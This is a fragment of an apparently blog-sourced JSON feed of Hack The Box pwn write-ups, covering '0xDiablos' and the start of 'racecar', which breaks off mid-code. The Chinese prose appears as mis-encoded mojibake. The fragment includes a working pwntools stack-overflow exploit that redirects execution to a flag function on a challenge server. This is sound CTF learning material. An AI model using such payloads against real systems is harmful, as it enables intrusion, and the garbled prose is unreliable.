class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>æŸ¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªæˆ‘ä»¬éœ€è¦çš„ flag</p>\n<p>ç›´æ¥æ‹–å…¥ ida32 æŸ¥çœ‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __gid_t v4; // [esp+0h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(stdout, 0, 2, 0);</span><br><span class=\"line\">  v4 = getegid();</span><br><span class=\"line\">  setresgid(v4, v4, v4);</span><br><span class=\"line\">  puts(&quot;You know who are 0xDiablos: &quot;);</span><br><span class=\"line\">  vuln();</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è°ƒç”¨äº† vuln å‡½æ•°</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int vuln()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s[180]; // [esp+0h] [ebp-B8h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  return puts(s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è¿™é‡Œæœ‰ä¸€ä¸ªå±é™©å‡½æ•° getsï¼Œs åˆ†é…äº† 180 çš„å†…å­˜ç©ºé—´</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char *__cdecl flag(int a1, int a2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char *result; // eax</span><br><span class=\"line\">  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF</span><br><span class=\"line\">  FILE *stream; // [esp+4Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class=\"line\">  if ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(&quot;Hurry up and try in on server side.&quot;);</span><br><span class=\"line\">    exit(0);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = fgets(s, 64, stream);</span><br><span class=\"line\">  if ( a1 == -559038737 &amp;&amp; a2 == -1059139571 )</span><br><span class=\"line\">    return (char *)printf(s);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è¿™ä¸ª flag å‡½æ•°ä½¿ç”¨äº† fopen è¯»å–äº†å†…å®¹å‚¨å­˜åˆ°äº† stream ä¸Šï¼Œæˆ‘ä»¬ç°åœ¨åªéœ€è¦è®©</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a1 == -559038737ä»¥åŠ a2 == -1059139571</span><br></pre></td></tr></table></figure></p>\n<p>å°±èƒ½å¾—åˆ° flag</p>\n<p>æŸ¥çœ‹æ±‡ç¼–ç å¾—åˆ°</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08049243 ; 13:   if ( a1 == -559038737 &amp;&amp; a2 == -1059139571 )</span><br><span class=\"line\">.text:08049243                 add     esp, 10h</span><br><span class=\"line\">.text:08049246                 cmp     [ebp+arg_0], 0DEADBEEFh</span><br><span class=\"line\">.text:0804924D                 jnz     short loc_8049269</span><br><span class=\"line\">.text:0804924F                 cmp     [ebp+arg_4], 0C0DED00Dh</span><br><span class=\"line\">.text:08049256                 jnz     short loc_804926C</span><br></pre></td></tr></table></figure></p>\n<p>ä¹Ÿå°±æ˜¯æ¯”è¾ƒ 0xDEADBEEF å’Œ 0xC0DED00D é‚£ç›´æ¥æ„é€  exp</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*188+p32(0x80491E2)+p32(0)+p32(0xDEADBEEF)+p32(0xC0DED00D)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;188.166.175.58&quot;,32705)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;Diablos:&quot;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-racecar-md/",
            "url": "https://lookhui.github.io/HTB-racecar-md/",
            "title": "HTB-racecar",
            "date_published": "2023-12-13T07:34:15.000Z",
            "content_html": "<h1 id=\"htb-racecar\"><a class=\"anchor\" href=\"#htb-racecar\">#</a> HTB-racecar</h1>\n<p>æŸ¥çœ‹ä¿æŠ¤</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    Canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>\n<p>ä¿æŠ¤å…¨å¼€</p>\n<p>ä½¿ç”¨ strings æŸ¥çœ‹ä¸€ä¸‹å­—æ®µ</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">exit</span><br><span class=\"line\">srand</span><br><span class=\"line\">fopen</span><br><span class=\"line\">puts</span><br><span class=\"line\">time</span><br><span class=\"line\">putchar</span><br><span class=\"line\">stdin</span><br><span class=\"line\">printf</span><br><span class=\"line\">fgets</span><br><span class=\"line\">strlen</span><br><span class=\"line\">read</span><br><span class=\"line\">stdout</span><br><span class=\"line\">malloc</span><br><span class=\"line\">alarm</span><br><span class=\"line\">atoi</span><br><span class=\"line\">sleep</span><br><span class=\"line\">__cxa_finalize</span><br><span class=\"line\">setvbuf</span><br><span class=\"line\">strcmp</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">__stack_chk_fail</span><br><span class=\"line\">GLIBC_2.1</span><br><span class=\"line\">GLIBC_2.1.3</span><br><span class=\"line\">GLIBC_2.4</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">UWVS</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">[1;33m</span><br><span class=\"line\">[1;36m</span><br><span class=\"line\">[1;32m</span><br><span class=\"line\">[1;31m</span><br><span class=\"line\">[1;34m</span><br><span class=\"line\">[1;35m</span><br><span class=\"line\">%s      ______                                       %s|xxx|</span><br><span class=\"line\">%s     /|_||_\\`.__                                   %s| F |</span><br><span class=\"line\">%s    (   _    _ _\\                                  %s|xxx|</span><br><span class=\"line\">%s*** =`-(_)--(_)-&#x27;                                  %s| I |</span><br><span class=\"line\">                                                   %s|xxx|</span><br><span class=\"line\">                                                   %s| N |</span><br><span class=\"line\">                                                   %s| I |</span><br><span class=\"line\">%s             _-_-  _/\\______\\__                    %s| S |</span><br><span class=\"line\">%s           _-_-__ / ,-. -|-  ,-.`-.                %s|xxx|</span><br><span class=\"line\">%s            _-_- `( o )----( o )-&#x27;                 %s| H |</span><br><span class=\"line\">%s                   `-&#x27;      `-&#x27;                    %s|xxx|</span><br><span class=\"line\">Select race:</span><br><span class=\"line\">1. Highway battle</span><br><span class=\"line\">2. Circuit</span><br><span class=\"line\">%s[-] Invalid choice!%s</span><br><span class=\"line\">Select car:</span><br><span class=\"line\">[*] Waiting for the race to finish...</span><br><span class=\"line\">[+] You won the race!! You get 100 coins!</span><br><span class=\"line\">[+] Current coins: [%d]%s</span><br><span class=\"line\">[!] Do you have anything to say to the press after your big victory?</span><br><span class=\"line\">&gt; %s</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">%s[-] Could not open flag.txt. Please contact the creator.</span><br><span class=\"line\">[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:</span><br><span class=\"line\">[-] You lost the race and all your coins!</span><br><span class=\"line\">%sInsert your data:</span><br><span class=\"line\">Name:</span><br><span class=\"line\">Nickname:</span><br><span class=\"line\">%s[+] Welcome [%s%s%s]!</span><br><span class=\"line\">%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!</span><br><span class=\"line\">[*] Current coins: [%d]</span><br><span class=\"line\">Car #1 stats:</span><br><span class=\"line\">[Speed]:        %s</span><br><span class=\"line\">[Acceleration]: %s</span><br><span class=\"line\">[Handling]:     %s</span><br><span class=\"line\">Car #2 stats:</span><br><span class=\"line\">[Speed]:        %s</span><br><span class=\"line\">[Acceleration]: %s</span><br><span class=\"line\">[Handling]:     %s</span><br><span class=\"line\">1. Car info</span><br><span class=\"line\">2. Car selection</span><br><span class=\"line\">;*2$&quot;</span><br><span class=\"line\">GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br><span class=\"line\">crtstuff.c</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">completed.7283</span><br><span class=\"line\">__do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__frame_dummy_init_array_entry</span><br><span class=\"line\">racecar.c</span><br><span class=\"line\">__FRAME_END__</span><br><span class=\"line\">__init_array_end</span><br><span class=\"line\">_DYNAMIC</span><br><span class=\"line\">__init_array_start</span><br><span class=\"line\">__GNU_EH_FRAME_HDR</span><br><span class=\"line\">_GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">strcmp@@GLIBC_2.0</span><br><span class=\"line\">read@@GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__x86.get_pc_thunk.bx</span><br><span class=\"line\">printf@@GLIBC_2.0</span><br><span class=\"line\">fgets@@GLIBC_2.0</span><br><span class=\"line\">_edata</span><br><span class=\"line\">time@@GLIBC_2.0</span><br><span class=\"line\">sleep@@GLIBC_2.0</span><br><span class=\"line\">alarm@@GLIBC_2.0</span><br><span class=\"line\">__stack_chk_fail@@GLIBC_2.4</span><br><span class=\"line\">__x86.get_pc_thunk.dx</span><br><span class=\"line\">__cxa_finalize@@GLIBC_2.1.3</span><br><span class=\"line\">banner</span><br><span class=\"line\">malloc@@GLIBC_2.0</span><br><span class=\"line\">__data_start</span><br><span class=\"line\">puts@@GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">exit@@GLIBC_2.0</span><br><span class=\"line\">__dso_handle</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">race_type</span><br><span class=\"line\">srand@@GLIBC_2.0</span><br><span class=\"line\">strlen@@GLIBC_2.0</span><br><span class=\"line\">__libc_start_main@@GLIBC_2.0</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">car_menu</span><br><span class=\"line\">stdin@@GLIBC_2.0</span><br><span class=\"line\">read_int</span><br><span class=\"line\">setvbuf@@GLIBC_2.0</span><br><span class=\"line\">fopen@@GLIBC_2.1</span><br><span class=\"line\">putchar@@GLIBC_2.0</span><br><span class=\"line\">_fp_hw</span><br><span class=\"line\">car_info</span><br><span class=\"line\">stdout@@GLIBC_2.0</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">main</span><br><span class=\"line\">coins</span><br><span class=\"line\">__stack_chk_fail_local</span><br><span class=\"line\">check</span><br><span class=\"line\">atoi@@GLIBC_2.0</span><br><span class=\"line\">__TMC_END__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">setup</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.plt.got</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>å‘ç°é‡Œé¢æœ‰ä¸€ä¸ª flag.txt</p>\n<p>æ‹–å…¥ ida32 æŸ¥çœ‹ main å‡½æ•°</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v3; // eax</span><br><span class=\"line\">  unsigned int v5; // [esp+0h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(0x14u);</span><br><span class=\"line\">  setup();</span><br><span class=\"line\">  banner();</span><br><span class=\"line\">  info();</span><br><span class=\"line\">  while ( check )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = menu();</span><br><span class=\"line\">    if ( v3 == 1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      car_info();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if ( v3 == 2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      check = 0;</span><br><span class=\"line\">      car_menu();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return __readgsdword(0x14u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>setup ();banner ();info (); è¿›è¡Œäº†åˆå§‹åŒ–</p>\n<p>åŒå‡» while (check) å¯å¾—çŸ¥ check ä¸º 1ï¼Œ</p>\n<p>v3 = menu (); ç›´æ¥è°ƒç”¨äº† menu æˆ‘ä»¬å» menu æŸ¥çœ‹ä¸€ä¸‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int menu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v1; // [esp+0h] [ebp-18h]</span><br><span class=\"line\">  int v2; // [esp+4h] [ebp-14h]</span><br><span class=\"line\">  int v3; // [esp+8h] [ebp-10h]</span><br><span class=\"line\"></span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;\\n1. Car info\\n2. Car selection\\n&gt; &quot;);</span><br><span class=\"line\">    v3 = read_int(v1, v2);</span><br><span class=\"line\">    if ( v3 != 2 &amp;&amp; v3 != 1 )</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v3 != 2 &amp;&amp; v3 != 1 );</span><br><span class=\"line\">  return v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>v3 ç­‰äºäº† read_int (v1,v2)</p>\n<p>æŸ¥çœ‹ read_int</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int read_int()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[32]; // [esp+Ch] [ebp-2Ch] BYREF</span><br><span class=\"line\">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readgsdword(0x14u);</span><br><span class=\"line\">  read(0, buf, 0x1Fu);</span><br><span class=\"line\">  return atoi(buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>æ‰€ä»¥ v3 ç­‰äºç”¨æˆ·è¾“å…¥çš„æ•°ï¼Œæœ€å¤§ä¸º 0x1f ä¹Ÿå°±æ˜¯ 31</p>\n<p>ç°åœ¨å°±çœ‹ v3 å€¼ä¸ºå¤šå°‘äº†</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = menu();</span><br><span class=\"line\">if ( v3 == 1 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  car_info();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else if ( v3 == 2 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  check = 0;</span><br><span class=\"line\">  car_menu();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>å¦‚æœ v3 ç­‰äº 1 è°ƒç”¨ car_info ()</p>\n<p>å¦‚æœ v3 ç­‰äº 2 è°ƒç”¨ car_menu () å¹¶ä¸” check=0 åœæ­¢å¾ªç¯</p>\n<p>å…ˆçœ‹ car_info () å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆå†…å®¹åªæ˜¯è¿›è¡Œäº†è¾“å‡º</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsigned int car_info()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int v1; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readgsdword(0x14u);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  puts(aCar1Stats);</span><br><span class=\"line\">  printf(aSpeedS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aAccelerationS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aHandlingS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  puts(aCar2Stats);</span><br><span class=\"line\">  printf(aSpeedS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aAccelerationS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aHandlingS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  return __readgsdword(0x14u) ^ v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>æŸ¥çœ‹ car_menu () çœ‹åˆ°äº†</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 